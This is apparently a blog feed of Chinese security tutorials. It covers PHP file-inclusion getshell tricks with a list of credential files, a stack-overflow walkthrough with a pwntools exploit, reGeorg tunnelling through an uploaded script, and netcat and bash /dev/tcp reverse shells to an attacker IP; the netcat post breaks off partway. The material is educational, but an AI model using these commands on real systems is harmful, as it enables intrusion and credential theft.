?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure><p>然后提示密码输入，随意输入就会登录失败。</p><p>之后在 remotehost 的 ssh-log 中就会出现刚刚登录的php代码，对 ssh-log包含即可执行。</p><hr><h2 id="environ包含getshell"><a href="#environ包含getshell" class="headerlink" title="environ包含getshell"></a>environ包含getshell</h2><p>利用条件：</p><blockquote><p>php以cgi方式运行，这样environ才会保持UA头。</p><p>environ文件存储位置已知，且environ文件可读。</p></blockquote><p>/proc/self/environ： Linux下的当前正在运行的进程的环境变量列表 ，访问能看到里面会有http请求头的信息。于是我们可以通过 user-agent变量进行代码注入，然后通过文件包含来读取并执行代码。</p><p>范例：</p><p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/user-agent%E6%B3%A8%E5%85%A5.png" alt></p><blockquote><p>上面例子是反弹了一个shell，我们也可以注普通的一句话</p></blockquote><hr><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>session 文件格式为 sess_[phpsessid] , phpsessid 作为cookie传递，在服务端文件位置会变化</p><p>默认路径是：</p><ul><li>/tmp/(PHP Sessions)</li></ul><p>也可能位于下面路径：</p><ul><li>/var/lib/php/session/(PHP Sessions)</li><li>/var/lib/php5/(PHP Sessions)</li><li>c:/windows/temp/(PHP Sessions)等文件中</li></ul><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇因为期末写了好多天，哎，长路漫漫，漫漫奋斗</p><p>附上敏感文件：</p><p>Linux下：</p><p> ssh免密码登录的秘钥文件等 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys </span><br><span class="line">/root/.ssh/id_rsa </span><br><span class="line">/root/.ssh/id_rsa.keystore </span><br><span class="line">/root/.ssh/id_rsa.pub </span><br><span class="line">/root/.ssh/known_hosts</span><br></pre></td></tr></table></figure><p>加密后的用户口令位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 历史命令 </span><br><span class="line">/root/.bash_history /root/.mysql_history</span><br></pre></td></tr></table></figure><p>进程文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br></pre></td></tr></table></figure><p>检查已经被系统挂载的设备 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts</span><br></pre></td></tr></table></figure><p>机器的内核配置文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure><p>window下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:/boot.ini  //查看系统版本  </span><br><span class="line">C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件  </span><br><span class="line">C:/Windows/repairsam  //存储系统初次安装的密码  </span><br><span class="line">C:/Program Files/mysqlmy.ini  //Mysql配置  </span><br><span class="line">C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root  </span><br><span class="line">C:/Windows/php.ini  //php配置信息  </span><br><span class="line">C:/Windows/my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;p&gt;看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>系统栈和经典栈溢出</title>
    <link href="http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://bai-ren-1.github.io/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2019-11-30T04:39:05.000Z</published>
    <updated>2019-11-30T08:59:30.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="系统栈和经典栈溢出"><a href="#系统栈和经典栈溢出" class="headerlink" title="系统栈和经典栈溢出"></a>系统栈和经典栈溢出</h1><h3 id="寄存器ebp和esp"><a href="#寄存器ebp和esp" class="headerlink" title="寄存器ebp和esp"></a>寄存器ebp和esp</h3><ul><li><p>寄存器ebp指向  <u>当前的栈帧</u> 的底部（高地址）；</p></li><li><p>寄存器esp指向  <u> 当前的栈帧</u> 的顶部（低地址）；</p></li></ul><h3 id="函数栈帧"><a href="#函数栈帧" class="headerlink" title="函数栈帧"></a>函数栈帧</h3><ul><li>函数返回地址：函数调用前的指令位置；</li><li>栈帧状态值：保存前栈帧的顶部和底部（实际只保存前栈帧的底部，顶部可以通过堆栈平衡计算得出）；</li><li>局部变量：为函数局部变量开辟的内存空间；</li></ul><h3 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h3><ul><li>参数入栈：</li></ul><p>参数从右往左依次压入系统栈中；</p><ul><li>返回地址入栈：</li></ul><p>当前代码区调用的指令的下一条指令地址入栈（call中的压栈）；</p><ul><li>代码区跳转：</li></ul><p>处理器从当前代码区跳转到被调用函数的入口处（call中的跳转）；</p><ul><li>调整栈帧：</li></ul><p>保存当前栈帧状态值 –&gt; ebp入栈（push ebp）；</p><p>将当前栈帧切换到新栈帧 –&gt; esp装入ebp的值，更新栈帧底部 （mov ebp，esp）；</p><p>给新栈帧分配空间 –&gt; 把esp减少所需空间大小，抬高栈顶（sub esp,xxx）；</p><p>对应汇编（假设三个参数）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push 参数2</span><br><span class="line"></span><br><span class="line">push 参数1</span><br><span class="line"></span><br><span class="line">push 参数0  // 至此调用第一步压参数完成</span><br><span class="line"></span><br><span class="line">call 调用地址  // 同时完成第二步和第三步，把下一条指令的地址压栈并跳转</span><br><span class="line"></span><br><span class="line">push ebp  // 保存当前栈</span><br><span class="line"></span><br><span class="line">mov ebp,esp // 设置新栈帧的底部（切换栈帧）</span><br><span class="line"></span><br><span class="line">sub esp，空间大小  // 设置新栈帧的顶部（抬高栈帧）</span><br></pre></td></tr></table></figure><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/push%E5%8F%82%E6%95%B0.png" alt></p><p>上图完成了第一步，把三个参数都压入栈中</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/call.png" alt></p><p>上图完成了第二步和第三步。call操作把下一条指令的地址作为返回地址压入栈，eip跳转到代码区执行</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E4%BF%9D%E5%AD%98%E6%97%A7%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成第四步中保存当前栈的操作，把当前栈的底部压入栈</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%9B%B4%E6%96%B0%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成了第四步里面的更新栈底，把栈顶指针移动到当前栈的最上方</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%BC%80%E8%BE%9F%E7%A9%BA%E9%97%B4.png" alt></p><p>栈顶指针自减上移，开辟了新的栈帧空间。上图到此完成了函数调用过程，形成了上图这样的调用栈</p><ul><li>除了最后一张图，其他图中称ebp为 “当前栈底” 是因为当前还没有通过sub来开辟新的栈帧，所以现在还是处在当前栈帧内。而且现在呈现出来的当前栈的  “底部在头部” 的现象是因为，我们是把当前的栈底的值拿到了顶部进行保存（），而不是改变栈底为栈顶，当前栈 “底部” 依然处在底部；</li><li>最后一张图的 “前栈帧” 是针对刚新开辟的栈帧空间来说的（即图上标注“栈帧空间的部分”），此时的栈帧已经不是上一点注释中的那个了。而且我们能通过前栈帧的ebp（上一点注释中 “位于顶部” 的 “底部”）这个值，定位出前一个栈；</li></ul><blockquote><p>附上一张 x86 系统调用栈（注意下图的栈方向和上面的相反）</p></blockquote><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.jpg" alt></p><h3 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们用以下gcc命令对程序进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example</span><br></pre></td></tr></table></figure><blockquote><p> m32 指的是生成 32 位程序； </p><p>-fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary；</p><p>关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie；</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）； </p></blockquote><p>则目前该程序不开启canary （没有canary导致可以覆盖出栈的空间） 、开启了NX （堆栈不可执行，即使在堆栈中写入shellcode也不能执行）、不开启 PIE 和 ASLR （没有地址随机化，让我们能直接覆盖上success的地址）</p><p>然后我们跟进 vulneravle函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出其栈结构：</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E7%BB%93%E6%9E%84.png" alt></p><p>因为程序里面有shellcode的函数success，我们不需要自己注入shellcode（也因为开启了NX在栈注入shellcode也没用），直接溢出覆盖原返回地址为函数success的地址即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line"><span class="comment">##ida解析出的success的地址</span></span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行该EXP得到结果。</p><h3 id="一般栈溢出做法"><a href="#一般栈溢出做法" class="headerlink" title="一般栈溢出做法"></a>一般栈溢出做法</h3><h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><h4 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h4><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener">stack buffer overflow</a></p><p><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3694.html</a></p><p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;系统栈和经典栈溢出&quot;&gt;&lt;a href=&quot;#系统栈和经典栈溢出&quot; class=&quot;headerlink&quot; title=&quot;系统栈和经典栈溢出&quot;&gt;&lt;/a&gt;系统栈和经典栈溢出&lt;/h1&gt;&lt;h3 id=&quot;寄存器ebp和esp&quot;&gt;&lt;a href=&quot;#寄存器ebp和esp&quot; cla
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之reGeorg</title>
    <link href="http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/"/>
    <id>http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/</id>
    <published>2019-11-21T00:38:30.000Z</published>
    <updated>2019-11-27T11:06:16.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具之reGeorg-代理"><a href="#内网渗透工具之reGeorg-代理" class="headerlink" title="内网渗透工具之reGeorg+代理"></a>内网渗透工具之reGeorg+代理</h1><p>继续我们之前的学习，在我们渗透工作中，经常会出现一个服务器连接着两个网卡的情况：一个是连接外网的网卡，另一个是连接内网的网卡。我们的目标就是他连接着的内网，但我们却不能直接使用这台服务器去访问内网，因为上面缺少了我们必要的工具。为此，我们可以将这台服务器设置为我们访问内网的代理，作为跳板机打进内网</p><p>网络拓扑如下图：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.png" alt></p><p>为了打出这样一条隧道，我们可以通过使用 reGeorg+Proxifier/ reGeorg +Prochains 做到，无论是哪种组合，关于 reGeorg 的操作都是一样的，所以我们把两种组合的 reGeorg 都拿出来一起说，再分别介绍不同的两个代理</p><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>安装reGeorg的过程不再赘述，直接 git clone 到 kali 上，使用脚本的时候 cd 进目录就行</p><p>然后我们需要根据目标站点使用的语言上传相应版本的tunnel的脚本，埋下伏笔，上传成功的时候会显示“ 乔治说：看起来一切都很好 ”，哈哈，确实如此。</p><p>然后我们假设文件上传在根目录下，可以通过访问下面的网址： </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://站点的网址/<span class="title">tunnel.php</span></span></span><br></pre></td></tr></table></figure><p>访问到我们上去的隧道文件，只要我们看到下面这样的字眼，说明第一步成功了：</p><blockquote><p>Georg says, ‘All seems fine’</p></blockquote><p>然后我们再回去kali里面进行使用reGeorg的py脚本建立连接，打出一条隧道，使用命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://站点的网址/tunnel.php(上传reGeorg脚本的地址) -p <span class="number">8888</span>（任意没有服务冲突的端口）</span><br></pre></td></tr></table></figure><p>执行的界面如下：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%95%8C%E9%9D%A2.png" alt></p><p>到目前这一步就算做好了，下面的就是代理的操作了。</p><h2 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h2><p>下面我们开始介绍 Proxifier ，首先安装后打开。然后选择 Profile-proxy servers 设置代理地址和端口（这里选择的是本地端口8888的socks5代理：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/proxixier%E8%AE%BE%E7%BD%AE.png" alt></p><p>然后我们就得配置代理规则（代理规则其实就相当于指定那个软件的流量经过代理，哪些不经过代理）</p><p>一般情况下我们需要使用浏览器访问内网的网页，所以就需要给浏览器配置经过代理，其他不需要代理的软件就这设为direct模式（不经过代理）</p><p> 选择 Profile-proxification Rules，根据自己的需要配置：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AE%E8%A7%84%E5%88%99.png" alt></p><p>然后我们就可以愉快的使用了proxifier了：</p><blockquote><p>选择   右键 -&gt; Proxifier -&gt; Proxy SOCKS 5 127.0.0.1<br>范例：<br>mstsc远程桌面右键使用代理运行实现远控内网；<br>cmd右键使用代理运行实现例如nmap扫描内网等各种功能；</p></blockquote><h2 id="Proxychain-ng"><a href="#Proxychain-ng" class="headerlink" title="Proxychain-ng"></a>Proxychain-ng</h2><p>下面我们开始介绍Proxychain，首先介绍安装：</p><p>先 git clone 到本地，然后进行操作。先进入本地文件夹，然后 ./configure 运行配置文件。等配置完成之后就使用</p><p>make &amp;&amp; make install 进行 make 安装：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain.png" alt></p><p>等上述安装完成后,把当前目录下的配置文件 /src/proxychains.conf 复制到 /etc/proxychains.conf 里面，删除上一层生成的文件夹，然后至此暂时阶段性胜利：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain-1.png" alt></p><p>然后我们对 /etc/proxychains.conf 进行配置，这里使用vim：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br><span class="line">socks4 127.0.0.1 9050 //9050为你自己的端口，需要与reGeorg中设置的端口相同</span><br></pre></td></tr></table></figure><p>界面如下，我们配置sock4的配置信息，9050修改为你需要的端口（因为上面reGeorg使用了8888端口，把9050改为8888），然后保存退出：<img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AEproxychains%E7%AB%AF%E5%8F%A3.png" alt></p><p>最后我们就能愉快的通过如下命令使用 proxychains 了：</p><blockquote><p>在需要设置代理的软件前面加上proxychains，范例：<br>proxychains nmap<br>proxychains sqlmap </p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具之reGeorg-代理&quot;&gt;&lt;a href=&quot;#内网渗透工具之reGeorg-代理&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具之reGeorg+代理&quot;&gt;&lt;/a&gt;内网渗透工具之reGeorg+代理&lt;/h1&gt;&lt;p&gt;继续我们之前的学习，
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之netcat</title>
    <link href="http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/"/>
    <id>http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/</id>
    <published>2019-11-18T08:30:46.000Z</published>
    <updated>2019-11-27T11:06:28.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具总结之netcat"><a href="#内网渗透工具总结之netcat" class="headerlink" title="内网渗透工具总结之netcat"></a>内网渗透工具总结之netcat</h1><p>继续上一篇的思路，继续学习总结内网穿透的工具。这次这个工具是也是老牌的工具，誉为瑞士军刀。不多逼逼直接学习他的使用</p><h2 id="nc反弹服务器shell"><a href="#nc反弹服务器shell" class="headerlink" title="nc反弹服务器shell"></a>nc反弹服务器shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>操作目标机将cmd /Bash shell 绑定到它的特定端口8888，再让攻击机用简单的nc命令连接到8888端口，从而使用目标机的shell服务</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB（Windows/Linux）</p><ul><li><p>在目标机上设置监听端口：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc -lvp <span class="number">8888</span> -e /bin/sh    [目标机为Linux]</span><br><span class="line"></span><br><span class="line">（<span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口）</span><br></pre></td></tr></table></figure></li><li><p>在攻击机上尝试连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标机的ip（ipB） <span class="number">8888</span></span><br></pre></td></tr></table></figure></li><li><p>连接成功之后就会在攻击机上得到远程目标机的shell</p></li></ul><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>攻击机监听它的特定端口8888，再操作目标机使用nc命令反向连接到8888端口，实现反弹shell</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB</p><ul><li>在攻击机上监听端口：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口</span><br></pre></td></tr></table></figure><ul><li>在目标机上尝试反向连接：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e /bin/sh    [目标机为Linux]</span><br></pre></td></tr></table></figure><ul><li>连接成功后会在攻击机上得到远程目标主机的shell</li></ul><h2 id="其他方式反弹shell-Linux服务器"><a href="#其他方式反弹shell-Linux服务器" class="headerlink" title="其他方式反弹shell(Linux服务器)"></a>其他方式反弹shell(Linux服务器)</h2><p>在上面反向连接中，需要目标机上装有netcat的服务，才能将服务器的shell反弹给攻击机。在很多时候，目标机上是没有该服务并且我们不能去上传或者下载到目标机上，那要如何让主机反弹shell呢？我们需要使用替代方法反向连接到攻击主机。</p><p>（注：下面无论哪种方式反弹shell都要先在自己的攻击机上开启端口监听，下面除了Bash反弹这个案例写了出来外，其他都默认用同样的方法在攻击机上用nc开启8888端口监听，然后我就不写出来了，特此说明（就是懒））</p><h3 id="Bash反向shell"><a href="#Bash反向shell" class="headerlink" title="Bash反向shell"></a>Bash反向shell</h3><p>同样在攻击机上监听8888端口等待服务器主动来反向连接</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后我们在目标机（Linux）的bash上执行下面的命令即可反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;＆/dev/tcp/192.168.100.113（攻击机ip）/4444 0&gt;＆1</span><br></pre></td></tr></table></figure><p>命令的解释：</p><ul><li>bash -i 是打开一个交互的bash </li><li>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp</li><li>0&gt;&amp;1 将标准输入重定向到标准输出中 </li></ul><blockquote><p>​    附上Linux中的文件描述符</p><ol><li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; </p></li><li><p>标准输出  